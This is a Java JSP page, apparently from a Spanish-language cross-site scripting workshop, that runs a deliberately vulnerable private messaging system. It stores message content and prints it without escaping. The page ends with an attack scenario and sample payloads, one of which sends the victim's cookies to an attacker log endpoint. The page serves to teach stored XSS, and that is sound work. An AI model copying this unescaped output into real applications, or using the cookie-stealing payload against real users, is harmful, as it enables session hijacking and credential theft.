<%@page import="com.jgranados.xss.workshop.db.DB"%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.util.*, java.text.SimpleDateFormat" %>
<%
DB database = (DB) application.getAttribute("DB");
    if (database == null) {
        database = new DB(application);

// Aplicación
        application.setAttribute("DB", database);

    }
String currentUser = "usuario_actual"; // Simular usuario logueado

// Enviar nuevo mensaje
if ("POST".equalsIgnoreCase(request.getMethod())) {
    String toUser = request.getParameter("to");
    String message = request.getParameter("message");
    
    if (toUser != null && message != null && !message.trim().isEmpty()) {
        Map<String, String> newMessage = new HashMap<>();
        newMessage.put("id", String.valueOf(System.currentTimeMillis()));
        newMessage.put("from", currentUser);
        newMessage.put("to", toUser);
        newMessage.put("content", message);
        newMessage.put("timestamp", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()));
        
        database.getMessagesDB().add(0, newMessage);
        
        // Guardar en archivo
        database.saveToFile();
    }
}

// Filtrar mensajes para el usuario actual
List<Map<String, String>> myMessages = new ArrayList<>();
if (database.getMessagesDB() != null) {
    for (Map<String, String> message : database.getMessagesDB()) {
        if (currentUser.equals(message.get("to"))) {
            myMessages.add(message);
        }
    }
}
%>
<html>
<head>
    <title>Sistema de Mensajes - XSS Stored</title>
    <style>
        body { font-family: Arial; margin: 40px; }
        .message-form { background: #e7f3ff; padding: 20px; margin: 10px 0; }
        .message { background: #f8f9fa; padding: 15px; margin: 10px 0; border-left: 4px solid #28a745; }
        .vulnerable { background: #f8d7da; padding: 10px; margin: 5px 0; }
        .user-info { background: #fff3cd; padding: 10px; margin: 10px 0; }
    </style>
</head>
<body>
    <h1>📨 Sistema de Mensajes - XSS Stored</h1>
    
    <div class="user-info">
        <p><strong>Usuario actual:</strong> <code><%= currentUser %></code></p>
        <p><strong>Mensajes recibidos:</strong> <%= myMessages.size() %></p>
    </div>

    <div class="vulnerable">
        <h3>⚠️ VULNERABILIDAD: Mensajes privados sin sanitización</h3>
        <p>Los mensajes se almacenan y muestran sin escapado HTML. Un atacante puede enviar mensajes maliciosos a usuarios específicos.</p>
    </div>

    <div class="message-form">
        <h3>✉️ Enviar Mensaje</h3>
        <form method="POST">
            <label>Para usuario:</label><br>
            <select name="to">
                <option value="usuario_actual">usuario_actual (ti mismo)</option>
                <option value="admin">admin</option>
                <option value="usuario1">usuario1</option>
                <option value="usuario2">usuario2</option>
            </select><br><br>
            
            <label>Mensaje:</label><br>
            <textarea name="message" rows="4" cols="50" placeholder="Escribe tu mensaje..."></textarea><br><br>
            
            <button type="submit">Enviar Mensaje</button>
        </form>
    </div>

    <h2>📥 Tus Mensajes Recibidos</h2>
    
    <% if (!myMessages.isEmpty()) { %>
        <% for (Map<String, String> message : myMessages) { %>
            <div class="message">
                <strong>De: <%= message.get("from") %></strong>
                <small style="color: #666;">- <%= message.get("timestamp") %></small>
                <div style="margin-top: 10px;"><%= message.get("content") %></div>
            </div>
        <% } %>
    <% } else { %>
        <p>No tienes mensajes nuevos.</p>
    <% } %>

    <div style="background: #fff3cd; padding: 15px; margin: 20px 0;">
        <h3>🎯 Escenario de Ataque en Mensajes:</h3>
        <ol>
            <li>Un atacante envía un mensaje con payload XSS a un usuario específico</li>
            <li>El mensaje se almacena en la base de datos</li>
            <li>Cuando el usuario objetivo ve sus mensajes, el payload se ejecuta</li>
            <li>El atacante puede robar cookies, credenciales, etc.</li>
        </ol>
        
        <h4>Payloads específicos para mensajes:</h4>
        <code>&lt;script&gt;alert('Mensaje malicioso para <%= currentUser %>')&lt;/script&gt;</code><br>
        <code>&lt;img src=x onerror="fetch('http://192.168.0.100:8080/attackers-app/log.jsp?info=user:<%= currentUser %>&cookie='+document.cookie)"&gt;</code>
    </div>

    <p><a href="stored-xss-index.jsp">← Volver al índice XSS Stored</a> | 
       <a href="index.jsp">← Volver al inicio</a></p>
</body>
</html>